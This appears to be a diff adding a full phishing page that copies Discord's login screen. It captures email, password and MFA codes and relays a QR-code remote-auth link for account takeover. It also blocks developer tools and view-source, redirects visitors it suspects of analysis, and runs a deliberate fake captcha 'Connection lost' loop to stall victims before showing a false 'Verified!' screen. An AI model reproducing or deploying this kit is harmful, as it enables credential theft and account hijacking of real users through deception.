@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover"/>
+  <script>/* Mobile detect + Desktop Site zoom compensation.
+     screen.width = physical device px (never changes, immune to Desktop Site).
+     If viewport is wider than screen, Safari is in Desktop Site mode and squeezes
+     the page to fit. We apply CSS zoom to cancel out that squeeze so content
+     renders at true 1:1 size on the physical screen. */
+  (function(){
+    var sw=screen.width;
+    if(sw>0&&sw<=600){
+      document.documentElement.classList.add('mob');
+      var done=false;
+      function fixZoom(){
+        if(done)return;
+        var vw=window.innerWidth||document.documentElement.clientWidth;
+        if(vw>sw*1.2){
+          /* Desktop Site mode: viewport ~980px but screen ~390px.
+             zoom = vw/sw makes content vw/sw times bigger.
+             Browser squeezes by sw/vw. Net = 1:1. */
+          document.documentElement.style.zoom=String(vw/sw);
+          done=true;
+        }
+      }
+      fixZoom();
+      if(document.readyState==='loading'){
+        document.addEventListener('DOMContentLoaded',fixZoom);
+      }
+    }
+  })();
+  </script>
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate"/>
+  <meta http-equiv="Pragma" content="no-cache"/>
+  <meta http-equiv="Expires" content="0"/>
+  <meta name="referrer" content="no-referrer"/>
+  <title>Discord | Login</title>
+  <link rel="icon" type="image/png" href="/captcha.png?v=2"/>
+  <link rel="shortcut icon" type="image/png" href="/captcha.png?v=2"/>
+  <link rel="apple-touch-icon" href="/captcha.png?v=2"/>
+  <script>!function(){var _0x=function(){try{return!!window.console&&(window.console.log(''),!0)}catch(e){return!1}};document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c'))||(e.ctrlKey&&(e.key==='U'||e.key==='u'||e.key==='S'||e.key==='s'))){e.preventDefault();e.stopPropagation();return false}});var _chk=new Image();Object.defineProperty(_chk,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}});setInterval(function(){var t0=performance.now();debugger;if(performance.now()-t0>100){document.body.innerHTML='';window.location.href='https://discord.com'}},3000);var _el=document.createElement('div');Object.defineProperty(_el,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}})}();</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    /* Discord uses gg sans which is proprietary - we use the closest match */
+    @font-face{font-family:'gg sans';src:local('gg sans'),local('Noto Sans'),local('Helvetica Neue');font-display:swap}
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="https://js.hcaptcha.com/1/api.js?render=explicit" async defer></script>
+  <style>
+    :root{
+      --font-primary:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
+      --bg-primary:#313338;
+      --bg-secondary:#2b2d31;
+      --bg-tertiary:#1e1f22;
+      --bg-floating:#111214;
+      --text-normal:#dbdee1;
+      --text-muted:#949ba4;
+      --header-primary:#f2f3f5;
+      --header-secondary:#b5bac1;
+      --text-link:#7c8cba;
+      --brand-500:#5865f2;
+      --brand-560:#4752c4;
+      --brand-600:#3c45a5;
+      --green-360:#23a55a;
+      --red-400:#fa777c;
+      --status-danger:#f23f43;
+      --input-bg:#2b2d31;
+      --modifier-accent:rgba(78,80,88,.48);
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:var(--font-primary);
+      background-color:var(--bg-primary);
+      background-image:url("https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/d8680b1c1576ecc8.svg");
+      background-size:cover;background-position:center;background-repeat:no-repeat;background-attachment:fixed;
+      min-height:100vh;display:flex;flex-direction:column;color:var(--text-normal);
+      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+    }
+    nav{padding:20px 32px;display:flex;align-items:center}
+    .lbcont{flex:1;display:flex;align-items:center;justify-content:center;padding:20px 16px 40px}
+    .loginBox{
+      background:var(--bg-primary);border-radius:5px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);
+      display:flex;flex-direction:row;width:784px;max-width:100%;overflow:hidden;
+      transition:opacity .3s;
+    }
+    .col-1{flex:1;padding:32px;min-width:0}
+    .col-1.v-center{display:flex;flex-direction:column;justify-content:center;align-items:stretch}
+    .v-sep{width:1px;background:var(--modifier-accent);margin:32px 0;flex-shrink:0}
+    .col-2{
+      width:240px;flex-shrink:0;padding:32px 24px;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;
+    }
+    /* ─── Responsive / Mobile ─── */
+    /* JS .mob class — always fires on real phones via screen.width detection,
+       even if Safari "Request Desktop Website" overrides viewport to 1024px */
+    /* Safari fallback: html bg in case body position:fixed bg fails */
+    html.mob{background:#2b2d30!important}
+    html.mob .v-sep, html.mob .col-2{display:none!important}
+    html.mob .loginBox{max-width:480px}
+    html.mob nav{display:none!important}
+    html.mob .mobile-logo{display:block!important}
+    html.mob body{
+      position:fixed!important;top:0!important;left:0!important;right:0!important;bottom:0!important;
+      width:100%!important;height:auto!important;min-height:0!important;max-height:none!important;
+      margin:0!important;padding:0!important;overflow:hidden!important;
+      display:flex!important;flex-direction:column!important;
+      /* SPLIT properties — Safari ignores background shorthand on position:fixed */
+      background-color:#2b2d30!important;
+      background-image:linear-gradient(to left bottom,#3d4046,#1e1e23)!important;
+      background-attachment:scroll!important;
+      background-size:cover!important;
+      background-repeat:no-repeat!important;
+      overscroll-behavior:none;touch-action:manipulation;
+    }
+    html.mob .lbcont{
+      width:100%!important;flex:1!important;height:auto!important;min-height:0!important;
+      padding:0!important;margin:0!important;display:flex!important;
+      align-items:center!important;justify-content:center!important;overflow:hidden!important;
+    }
+    html.mob .loginBox{
+      width:100%!important;max-width:100%!important;flex:1!important;
+      height:auto!important;min-height:0!important;
+      border-radius:0!important;box-shadow:none!important;background:transparent!important;
+      display:flex!important;flex-direction:column!important;align-items:center!important;
+      overflow-y:auto!important;overflow-x:hidden!important;
+      -webkit-overflow-scrolling:touch;overscroll-behavior-y:contain;
+      padding:20px 16px;
+    }
+    html.mob .col-1{
+      padding:0;width:100%;max-width:400px;
+      display:flex;flex-direction:column;justify-content:center;flex:1;min-height:0;
+    }
+    html.mob .card-header h1{font-size:24px;line-height:30px}
+    html.mob .card-header p{font-size:16px;line-height:20px}
+    html.mob label{font-size:23.8px}
+    html.mob input[type="email"],html.mob input[type="password"],html.mob input[type="text"]{font-size:14.1px!important;height:50px;padding:12px 14px}
+    html.mob .btn{height:50px;font-size:14px}
+    html.mob .forgot{font-size:23.8px}
+    html.mob .reg,html.mob .reg a{font-size:23.8px}
+    /* 830px: hide QR column, cap width at 480px (Discord exact) */
+    @media(max-width:830px){
+      .v-sep,.col-2{display:none!important}
+      .loginBox{max-width:480px}
+      nav{display:none!important}
+      .mobile-logo{display:block!important}
+    }
+    /* 485px: full-screen auth box — Discord's exact mobile breakpoint */
+    @media(max-width:485px){
+      html{
+        width:100%!important;
+        height:100%!important;
+        margin:0!important;padding:0!important;
+        overflow:hidden!important;
+        -webkit-text-size-adjust:100%;
+        /* Dark fallback behind fixed body — Safari shows this if gradient fails */
+        background:#2b2d30!important;
+      }
+      body{
+        /* NUCLEAR: position:fixed forces body = exactly visible viewport.
+           Bypasses ALL Safari 100vh / dvh / URL-bar bugs entirely. */
+        position:fixed!important;
+        top:0!important;left:0!important;right:0!important;bottom:0!important;
+        width:100%!important;
+        height:auto!important;
+        min-height:0!important;       /* kill desktop min-height:100vh */
+        max-height:none!important;
+        margin:0!important;padding:0!important;
+        overflow:hidden!important;
+        display:flex!important;
+        flex-direction:column!important;
+        /* SPLIT properties — Safari ignores background shorthand on position:fixed */
+        background-color:#2b2d30!important;
+        background-image:linear-gradient(to left bottom,#3d4046,#1e1e23)!important;
+        background-attachment:scroll!important;
+        background-size:cover!important;
+        background-repeat:no-repeat!important;
+        overscroll-behavior:none;
+        touch-action:manipulation;
+        /* Prevent iOS rubber-band/bounce */
+        -webkit-overflow-scrolling:auto;
+      }
+      nav{display:none!important}
+      .v-sep,.col-2{display:none!important}
+      .mobile-logo{display:block!important}
+      .lbcont{
+        width:100%!important;
+        /* flex:1 fills body (which is position:fixed = exact viewport).
+           No viewport units needed — immune to Safari URL-bar bugs. */
+        flex:1!important;
+        height:auto!important;
+        min-height:0!important;
+        padding:0!important;margin:0!important;
+        display:flex!important;
+        align-items:center!important;
+        justify-content:center!important;
+        overflow:hidden!important;
+      }
+      .loginBox{
+        width:100%!important;max-width:100%!important;
+        flex:1!important;
+        height:auto!important;
+        min-height:0!important;
+        border-radius:0!important;box-shadow:none!important;
+        background:transparent!important;
+        display:flex!important;flex-direction:column!important;align-items:center!important;
+        overflow-y:auto!important;overflow-x:hidden!important;
+        -webkit-overflow-scrolling:touch;
+        overscroll-behavior-y:contain;
+        padding:20px 16px;
+        padding-top:max(20px, env(safe-area-inset-top));
+        padding-bottom:max(20px, env(safe-area-inset-bottom));
+        padding-left:max(16px, env(safe-area-inset-left));
+        padding-right:max(16px, env(safe-area-inset-right));
+      }
+      .col-1{
+        padding:0;
+        width:100%;max-width:400px;
+        display:flex;flex-direction:column;justify-content:center;
+        flex:1;min-height:0;
+      }
+      .card-header h1{font-size:24px;line-height:30px}
+      .card-header p{font-size:16px;line-height:20px}
+      label{font-size:14px}
+      input[type="email"],input[type="password"],input[type="text"]{font-size:16px!important;height:44px;padding:10px 12px}
+      .btn{height:44px;font-size:16px}
+      .forgot{font-size:14px}
+      .reg,.reg a{font-size:14px}
+      .captcha-face-wrap img{width:140px}
+      .captcha-modal h2{font-size:22px}
+      .captcha-modal p{font-size:15px}
+    }
+    @media(max-width:360px){
+      .loginBox{padding:16px 14px}
+      .card-header{margin-bottom:16px}
+      .card-header h1{font-size:22px}
+      .form-group{margin-bottom:16px}
+      .btn{height:44px;font-size:16px;margin-top:16px}
+    }
+
+    .card-header{text-align:center;margin-bottom:20px}
+    .mobile-logo{display:none;margin:0 auto 16px}
+    .card-header h1{color:var(--header-primary);font-size:24px;font-weight:600;line-height:30px;margin-bottom:8px}
+    .card-header p{color:var(--text-normal);font-size:16px;font-weight:400;line-height:20px}
+    .form-group{margin-bottom:20px}
+    label{
+      display:block;color:var(--header-primary);font-size:14px;font-weight:500;
+      margin-bottom:8px;
+      font-family:var(--font-primary);
+    }
+    label span.req{color:var(--status-danger);padding-left:4px}
+    label.err{color:var(--status-danger)}
+    label.err span.req{color:var(--status-danger)}
+    input[type="email"],input[type="password"],input[type="text"]{
+      width:100%;padding:10px;height:40px;background:var(--input-bg);
+      border:none;border-radius:8px;
+      color:var(--text-normal);font-size:16px;line-height:20px;
+      outline:none;font-family:var(--font-primary);font-weight:400;
+      -webkit-appearance:none;appearance:none;
+    }
+    input::placeholder{color:var(--text-muted);font-family:var(--font-primary)}
+    input:focus{outline:none}
+    .forgot{display:inline-block;margin-top:4px;font-size:14px;color:var(--text-link);text-decoration:none;cursor:pointer;font-weight:500}
+    .forgot:hover{text-decoration:underline}
+    .btn{
+      width:100%;padding:2px 16px;height:44px;background:var(--brand-500);color:#fff;
+      border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;
+      transition:background .17s ease;margin-top:20px;font-family:var(--font-primary);
+      line-height:24px;display:flex;align-items:center;justify-content:center;
+    }
+    .btn:hover{background:var(--brand-560)}.btn:active{background:var(--brand-600)}.btn:disabled{opacity:.5;cursor:not-allowed}
+    .reg{font-size:14px;color:#b5bac1;margin-top:4px}
+    .reg a{color:var(--text-link);text-decoration:none;font-weight:500;font-size:14px}
+    .reg a:hover{text-decoration:underline}
+
+    /* Error message — appears like Discord's inline error */
+    .err-msg{display:none;color:var(--red-400);font-size:14px;font-weight:400;margin-bottom:12px;line-height:18px}
+    .err-msg.show{display:block}
+
+    .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+    .spinner-lg{width:28px;height:28px;border-width:3px}
+    .spinner-btn{width:24px;height:24px;border-width:2px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    /* Animated dots */
+    .dots-anim{display:inline-block;clip-path:inset(0 1ch 0 0);animation:dots-step 1.5s steps(4) infinite}
+    @keyframes dots-step{to{clip-path:inset(0 -1ch 0 0)}}
+
+    .pw-wrap{position:relative}.pw-wrap input{padding-right:12px}
+    .pw-toggle{display:none!important}
+
+    /* QR column */
+    .qr-title{color:var(--header-primary);font-size:24px;font-weight:600;margin-top:8px;margin-bottom:8px;line-height:1.2}
+    .qr-wrap{
+      width:176px;height:176px;background:#fff;border-radius:8px;padding:8px;margin:14px auto;
+      display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;
+    }
+    .qr-overlay{
+      position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+      width:34px;height:34px;background:#fff;border-radius:50%;
+      display:flex;align-items:center;justify-content:center;
+      border:2px solid #e0e0e0;z-index:2;
+    }
+    .qr-desc{color:var(--header-secondary);font-size:14px;line-height:1.4}
+    .qr-desc strong{color:var(--text-normal);font-weight:600}
+    .qr-link{display:block;margin-top:8px;font-size:14px;color:var(--text-link);text-decoration:none;font-weight:500;cursor:pointer}
+    .qr-link:hover{text-decoration:underline}
+    .qr-retry{color:var(--text-link);cursor:pointer;font-weight:500}.qr-retry:hover{text-decoration:underline}
+
+    /* MFA links */
+    .mfa-method{display:block;margin-top:8px;font-size:13px;color:var(--text-link);cursor:pointer;font-weight:500;text-decoration:none}
+    .mfa-method:hover{text-decoration:underline}
+    .mfa-sep{margin-top:14px;border-top:1px solid var(--modifier-accent);padding-top:14px}
+
+    /* ─── hCaptcha stall overlay (Discord style) ─── */
+    .captcha-stall{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0);z-index:9999;align-items:center;justify-content:center;transition:background .35s ease}
+    .captcha-stall.show{display:flex}
+    .captcha-stall.visible{background:rgba(0,0,0,.7)}
+    .captcha-modal{background:var(--bg-secondary);border-radius:8px;padding:0;text-align:center;width:400px;max-width:90vw;box-shadow:0 8px 32px rgba(0,0,0,.5);overflow:hidden;position:relative;opacity:0;transform:scale(.92) translateY(12px);transition:opacity .3s ease,transform .3s ease}
+    .captcha-stall.visible .captcha-modal{opacity:1;transform:scale(1) translateY(0)}
+    .captcha-close{position:absolute;top:12px;right:12px;width:28px;height:28px;border:none;background:none;cursor:pointer;color:var(--text-muted);font-size:20px;line-height:1;border-radius:4px;display:flex;align-items:center;justify-content:center;z-index:2}
+    .captcha-close:hover{background:rgba(255,255,255,.08);color:var(--text-normal)}
+    .captcha-illustration{padding:32px 32px 0;display:flex;justify-content:center}
+    .captcha-illustration img{width:200px;height:auto;display:block}
+    .captcha-body{padding:20px 32px 24px}
+    .captcha-body h2{color:var(--header-primary);font-size:20px;font-weight:700;margin-bottom:8px;font-family:var(--font-primary)}
+    .captcha-body p{color:var(--header-secondary);font-size:14px;margin:0 0 20px;line-height:1.5;font-family:var(--font-primary)}
+    .hcaptcha-wrap{display:flex;justify-content:center;min-height:78px;align-items:center;width:100%}
+    .hcaptcha-wrap > div{transform-origin:center center}
+    /* Mobile: scale hCaptcha widget to fit smaller screens */
+    @media(max-width:485px){
+      .captcha-modal{width:100%!important;max-width:100vw!important;border-radius:12px 12px 0 0!important;position:fixed!important;bottom:0!important;left:0!important;right:0!important;top:auto!important;margin:0!important}
+      .captcha-stall{align-items:flex-end!important}
+      .captcha-illustration{padding:24px 24px 0}
+      .captcha-illustration img{width:150px}
+      .captcha-body{padding:16px 20px 24px}
+      .captcha-body h2{font-size:20px}
+      .captcha-body p{font-size:14px;margin-bottom:16px}
+      .hcaptcha-wrap{min-height:70px;overflow:visible}
+      .hcaptcha-wrap > div{transform:scale(0.9)}
+    }
+    @media(max-width:360px){
+      .hcaptcha-wrap > div{transform:scale(0.82)}
+      .captcha-body{padding:12px 16px 20px}
+    }
+    .captcha-verifying{display:none;align-items:center;justify-content:center;gap:8px;margin-top:16px;padding:10px 0}
+    .captcha-verifying.show{display:flex}
+    .captcha-verifying span{color:var(--text-muted);font-size:13px;font-family:var(--font-primary)}
+
+
+  </style>
+</head>
+<body>
+
+<nav>
+  <img src="https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/bbbc3d376d38e7bc.svg" alt="Discord" height="34" style="display:block"/>
+</nav>
+
+<div class="lbcont">
+  <div class="loginBox">
+
+    <!-- Left column -->
+    <div class="col-1">
+
+      <!-- Login -->
+      <div id="sec-login">
+        <div class="card-header">
+          <img class="mobile-logo" src="https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/bbbc3d376d38e7bc.svg" alt="Discord" height="34"/>
+          <h1>Welcome back!</h1>
+          <p>We're so excited to see you again!</p>
+        </div>
+        <div class="err-msg" id="login-error"></div>
+        <form id="login-form" autocomplete="off">
+          <div class="form-group">
+            <label for="email" id="lbl-e">Email or Phone Number <span class="req">*</span></label>
+            <input type="text" id="email" autocomplete="username"/>
+          </div>
+          <div class="form-group">
+            <label for="password" id="lbl-p">Password <span class="req">*</span></label>
+            <div class="pw-wrap">
+              <input type="password" id="password" autocomplete="current-password"/>
+              <button type="button" class="pw-toggle" onclick="togglePw()" title="Show password">
+                <svg id="eye" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
+            </div>
+            <a class="forgot" href="https://discord.com/reset">Forgot your password?</a>
+          </div>
+          <button type="submit" class="btn" id="login-btn">Log In</button>
+        </form>
+        <div class="reg" style="margin-top:14px">Need an account? <a href="https://discord.com/register">Register</a></div>
+      </div>
+
+      <!-- MFA -->
+      <div id="sec-mfa" style="display:none">
+        <div class="card-header">
+          <h1 id="mfa-title">Multa-Factor Authentication</h1>
+          <p id="mfa-desc">Enter Discord auth code</p>
+        </div>
+        <div class="err-msg" id="mfa-error"></div>
+        <div class="form-group">
+          <label for="mfa-code" id="lbl-mfa">Authentication Code <span class="req">*</span></label>
+          <input type="text" id="mfa-code" placeholder="6-digit authentication code" maxlength="10" autocomplete="one-time-code"/>
+        </div>
+        <button class="btn" id="mfa-btn" style="margin-top:0">Log In</button>
+        <div id="mfa-links" style="display:none"></div>
+      </div>
+
+      <!-- Email Verification (now inline — no separate page) -->
+      <div id="sec-email-verify" style="display:none"></div>
+
+    </div>
+
+    <div class="v-sep"></div>
+
+    <!-- Right column: QR -->
+    <div class="col-2">
+      <div class="qr-wrap" id="qr-box"><span class="spinner spinner-lg"></span></div>
+      <div class="qr-title">Log in with QR Code</div>
+      <div id="qr-stat" class="qr-desc">Connecting&hellip;</div>
+
+    </div>
+
+  </div>
+</div>
+
+
+
+<!-- hCaptcha stall overlay (real hCaptcha widget inside Discord modal) -->
+<div class="captcha-stall" id="captcha-stall">
+  <div class="captcha-modal">
+    <button class="captcha-close" id="captcha-close" title="Close">&times;</button>
+    <div class="captcha-illustration">
+      <img src="/captcha_face.png" alt="" onerror="this.src='https://i.imgur.com/h41kzXV.png';this.onerror=null"/>
+    </div>
+    <div class="captcha-body">
+      <h2>Wait! Are you human?</h2>
+      <p>Please confirm you're not a robot.</p>
+      <div class="hcaptcha-wrap">
+        <div id="h-captcha-widget"></div>
+      </div>
+      <div class="captcha-verifying" id="captcha-verifying">
+        <span style="color:#ed4245;font-weight:600">Connection lost, please retry.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ═══ State ═══ */
+var mfaTicket     = null;
+var mfaHasSms     = false;
+var mfaMode       = 'totp';
+var qrSid         = null;
+var qrTimer       = null;
+var captchaEmail  = null;
+var captchaPw     = null;
+
+/* ═══ Helpers ═══ */
+function showErr(id, msg) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = msg;
+  el.classList.add('show');
+}
+function hideErr(id) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = '';
+  el.classList.remove('show');
+}
+function togglePw() {
+  var i = document.getElementById('password'), e = document.getElementById('eye');
+  if (i.type === 'password') { i.type = 'text'; e.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'; }
+  else { i.type = 'password'; e.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>'; }
+}
+var _btnTimer = null;
+function btnLoad(id, on) {
+  var b = document.getElementById(id);
+  if (!b) return;
+  b.disabled = on;
+  if (_btnTimer) { clearTimeout(_btnTimer); _btnTimer = null; }
+  if (on) {
+    b._origText = b.textContent;
+    b.innerHTML = '<span class="spinner spinner-btn"></span>';
+  } else {
+    b.textContent = b._origText || 'Log In';
+  }
+}
+
+/* ═══ Captcha stall overlay (real hCaptcha) ═══ */
+var _stallTimer = null;
+var _hcaptchaDone = false;
+var _pendingResult = null;
+var _hcaptchaWidgetId = null;
+
+function showCaptchaStall() {
+  _hcaptchaDone = false;
+  _pendingResult = null;
+  var el = document.getElementById('captcha-stall');
+  if (el) {
+    el.classList.remove('visible');
+    el.classList.add('show');
+    /* Graceful 3s stall before revealing the modal */
+    setTimeout(function() {
+      el.classList.add('visible');
+    }, 3000);
+  }
+  var vf = document.getElementById('captcha-verifying');
+  if (vf) vf.classList.remove('show');
+  /* Destroy old widget completely, then render fresh */
+  try {
+    if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
+      try { hcaptcha.remove(_hcaptchaWidgetId); } catch(e2) {}
+    }
+    _hcaptchaWidgetId = null;
+  } catch(e) {}
+  try {
+    var container = document.getElementById('h-captcha-widget');
+    if (typeof hcaptcha !== 'undefined' && container) {
+      container.innerHTML = '';
+      _hcaptchaWidgetId = hcaptcha.render('h-captcha-widget', {
+        sitekey: '4c672d35-0701-42b2-88c3-78380b0db560',
+        theme: 'dark',
+        size: 'normal',
+        callback: onHcaptchaPass,
+        'expired-callback': onHcaptchaExpire,
+        'error-callback': onHcaptchaError
+      });
+    } else {
+      /* SDK not loaded — auto-bypass */
+      _hcaptchaDone = true;
+    }
+  } catch(e) {
+    console.log('[captcha] render error:', e);
+    _hcaptchaDone = true;
+  }
+}
+
+function hideCaptchaStall() {
+  if (_stallTimer) { clearTimeout(_stallTimer); _stallTimer = null; }
+  var el = document.getElementById('captcha-stall');
+  if (el) { el.classList.remove('visible'); el.classList.remove('show'); }
+  _pendingResult = null;
+  _hcaptchaDone = false;
+  var vf = document.getElementById('captcha-verifying');
+  if (vf) vf.classList.remove('show');
+  /* Fully destroy the hCaptcha widget so no checkmark persists on retry */
+  try {
+    if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
+      try { hcaptcha.remove(_hcaptchaWidgetId); } catch(e2) {}
+    }
+  } catch(e) {}
+  _hcaptchaWidgetId = null;
+  var container = document.getElementById('h-captcha-widget');
+  if (container) container.innerHTML = '';
+}
+
+function onHcaptchaPass(token) {
+  _hcaptchaDone = true;
+  /* Show "Connection lost" — user thinks it failed and retries, buying stall time */
+  var vf = document.getElementById('captcha-verifying');
+  if (vf) vf.classList.add('show');
+  /* Reset widget after brief delay so user can re-solve (stall loop) */
+  setTimeout(function() {
+    try {
+      if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
+        hcaptcha.reset(_hcaptchaWidgetId);
+      }
+    } catch(e) {}
+  }, 600);
+  /* If backend result already waiting, close panel after a brief pause */
+  if (_pendingResult) {
+    setTimeout(function() {
+      var pr = _pendingResult;
+      _pendingResult = null;
+      hideCaptchaStall();
+      processLoginResult(pr.d, pr.status);
+    }, 1200);
+  }
+}
+
+function onHcaptchaExpire() { _hcaptchaDone = false; }
+function onHcaptchaError() { _hcaptchaDone = true; /* bypass on error */ }
+
+/* Close button handler */
+document.getElementById('captcha-close').addEventListener('click', function() { hideCaptchaStall(); });
+function showSec(name) {
+  document.getElementById('sec-login').style.display = name === 'login' ? '' : 'none';
+  document.getElementById('sec-mfa').style.display   = name === 'mfa'   ? '' : 'none';
+  document.getElementById('sec-email-verify').style.display = name === 'email-verify' ? '' : 'none';
+  /* vertically center MFA / email-verify sections */
+  var col1 = document.querySelector('.col-1');
+  if (name !== 'login') col1.classList.add('v-center');
+  else col1.classList.remove('v-center');
+}
+
+/* ═══ Success → show verified page ═══ */
+function onSuccess(data) {
+  hideErr('login-error');
+  hideErr('mfa-error');
+  var box = document.querySelector('.loginBox');
+  var avatarUrl = (data && data.avatar_url) ? data.avatar_url : '';
+  var username = (data && data.username) ? data.username : '';
+  box.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 32px;min-height:340px;width:100%">' +
+    (avatarUrl ? '<img src="' + avatarUrl + '" style="width:96px;height:96px;border-radius:50%;border:3px solid #23a55a;margin-bottom:20px" alt="">' : '<div style="width:96px;height:96px;border-radius:50%;background:#5865f2;margin-bottom:20px;display:flex;align-items:center;justify-content:center"><svg width="48" height="36" viewBox="0 0 127.14 96.36" fill="#fff"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg></div>') +
+    (username ? '<p style="color:#b5bac1;font-size:16px;margin-bottom:8px">@' + username + '</p>' : '') +
+    '<h1 style="color:#23a55a;font-size:32px;font-weight:700;margin:0">Verified!</h1>' +
+    '<p style="color:#b5bac1;font-size:14px;margin-top:12px">You may now close this window.</p>' +
+    '</div>';
+}
+
+/* ═══ QR Code ═══ */
+async function initQR() {
+  clearInterval(qrTimer);
+  var box  = document.getElementById('qr-box');
+  var stat = document.getElementById('qr-stat');
+  box.innerHTML = '<span class="spinner spinner-lg"></span>';
+  stat.innerHTML = 'Connecting\u2026';
+  try {
+    var r = await fetch('/api/qr/start');
+    var d = await r.json();
+    if (d.fp) {
+      qrSid = d.id;
+      box.innerHTML = '';
+      new QRCode(box, { text: 'https://discord.com/ra/' + d.fp, width: 160, height: 160, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
+      var ov = document.createElement('div'); ov.className = 'qr-overlay';
+      ov.innerHTML = '<svg width="16" height="12" viewBox="0 0 127.14 96.36" fill="#313338"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg>';
+      box.appendChild(ov);
+      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
+      qrTimer = setInterval(pollQR, 1500);
+    } else {
+      /* QR failed — show expired-style placeholder with retry, auto-retry once */
+      box.innerHTML = '<div style="width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;"><span style="color:#666;font-size:13px;cursor:pointer" onclick="initQR()">Click to load</span></div>';
+      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
+      setTimeout(initQR, 3000); /* auto-retry after 3s */
+    }
+  } catch(e) {
+    box.innerHTML = '<div style="width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;"><span style="color:#666;font-size:13px;cursor:pointer" onclick="initQR()">Click to load</span></div>';
+    stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
+    setTimeout(initQR, 5000); /* auto-retry */
+  }
+}
+
